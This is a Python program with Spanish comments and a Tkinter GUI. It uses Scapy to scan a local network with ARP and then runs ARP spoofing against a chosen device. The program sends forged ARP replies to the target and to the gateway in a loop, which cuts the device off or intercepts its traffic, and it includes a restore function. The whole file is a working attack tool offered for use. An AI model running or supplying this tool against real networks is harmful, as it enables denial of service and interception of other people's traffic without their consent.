import tkinter as tk
from tkinter import scrolledtext, messagebox
from scapy.all import ARP, Ether, srp, send
import threading
import uuid
import time
from scapy.config import conf

# Configuración para que Scapy use Npcap si está disponible
conf.use_pcap = True

# Configuración inicial
ip_puerta_enlace = "192.168.1.1"  # Configura la IP de la puerta de enlace predeterminada de tu red
mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
ataque_en_curso = False
dispositivos_detectados = []

# Función para obtener la MAC de un dispositivo
def obtener_mac(ip):
    solicitud_arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether / solicitud_arp
    resultado = srp(paquete, timeout=2, verbose=0)[0]
    for enviado, recibido in resultado:
        return recibido.hwsrc
    return None

# Función para escanear la red y encontrar dispositivos
def escanear_red():
    global dispositivos_detectados
    dispositivos_detectados.clear()
    rango_ip = f"{ip_puerta_enlace.rsplit('.', 1)[0]}.1/24"
    solicitud_arp = ARP(pdst=rango_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether / solicitud_arp
    
    print("Iniciando escaneo de red...")  # Mensaje de depuración
    resultado = srp(paquete, timeout=5, verbose=0)[0]  # Timeout aumentado a 5

    if resultado:
        for enviado, recibido in resultado:
            dispositivo = {"ip": recibido.psrc, "mac": recibido.hwsrc}
            dispositivos_detectados.append(dispositivo)
            print(f"Dispositivo detectado: IP={dispositivo['ip']}, MAC={dispositivo['mac']}")  # Depuración
    else:
        print("No se detectaron dispositivos.")  # Depuración si no se encuentran dispositivos

    actualizar_lista_dispositivos()

# Actualizar la lista en la interfaz
def actualizar_lista_dispositivos():
    lista_dispositivos.delete(0, tk.END)
    for dispositivo in dispositivos_detectados:
        lista_dispositivos.insert(tk.END, f"IP: {dispositivo['ip']} - MAC: {dispositivo['mac']}")
    if not dispositivos_detectados:
        lista_dispositivos.insert(tk.END, "No se encontraron dispositivos en la red.")

# Función para iniciar el ataque ARP spoofing
def spoofing_arp(ip_objetivo, widget_salida):
    global ataque_en_curso
    mac_objetivo = obtener_mac(ip_objetivo)
    if not mac_objetivo:
        widget_salida.insert(tk.END, f"No se pudo obtener la dirección MAC de {ip_objetivo}.\n")
        return

    widget_salida.insert(tk.END, f"MAC objetivo {ip_objetivo}: {mac_objetivo}\n")
    
    respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
    respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)

    while ataque_en_curso:
        send(respuesta_arp_objetivo, verbose=0)
        send(respuesta_arp_puerta, verbose=0)
        widget_salida.insert(tk.END, f"Enviando ARP spoofing a {ip_objetivo}...\n")
        widget_salida.see(tk.END)
        time.sleep(2)

# Función para restaurar la conexión del dispositivo
def restaurar_conexion(ip_objetivo):
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)
    if mac_objetivo and mac_puerta:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)
        send(respuesta_arp_objetivo, count=5, verbose=0)
        send(respuesta_arp_puerta, count=5, verbose=0)

# Interfaz gráfica con Tkinter
def iniciar_spoofing():
    global ataque_en_curso
    ip_objetivo = obtener_ip_seleccionada()
    if ip_objetivo:
        widget_salida.delete(1.0, tk.END)
        ataque_en_curso = True  
        hilo = threading.Thread(target=spoofing_arp, args=(ip_objetivo, widget_salida), daemon=True)
        hilo.start()

def detener_spoofing():
    global ataque_en_curso
    ataque_en_curso = False  
    widget_salida.insert(tk.END, "Ataque cancelado.\n")
    widget_salida.see(tk.END)

def desbloquear_dispositivo():
    ip_objetivo = obtener_ip_seleccionada()
    if ip_objetivo:
        restaurar_conexion(ip_objetivo)
        widget_salida.insert(tk.END, f"Conexión restaurada para {ip_objetivo}.\n")

def obtener_ip_seleccionada():
    seleccion = lista_dispositivos.curselection()
    if seleccion:
        return dispositivos_detectados[seleccion[0]]["ip"]
    else:
        messagebox.showwarning("Selección necesaria", "Seleccione un dispositivo de la lista.")
        return None

ventana = tk.Tk()
ventana.title("Analizador de Red y Control de Conexiones")

# Widgets de la interfaz
tk.Button(ventana, text="Escanear Red", command=escanear_red).pack(pady=5)
lista_dispositivos = tk.Listbox(ventana, width=50, height=10)
lista_dispositivos.pack(pady=5)

tk.Button(ventana, text="Iniciar Bloqueo", command=iniciar_spoofing).pack(pady=5)
tk.Button(ventana, text="Detener Bloqueo", command=detener_spoofing).pack(pady=5)
tk.Button(ventana, text="Desbloquear", command=desbloquear_dispositivo).pack(pady=5)

widget_salida = scrolledtext.ScrolledText(ventana, width=60, height=15)
widget_salida.pack(pady=5)

ventana.mainloop()
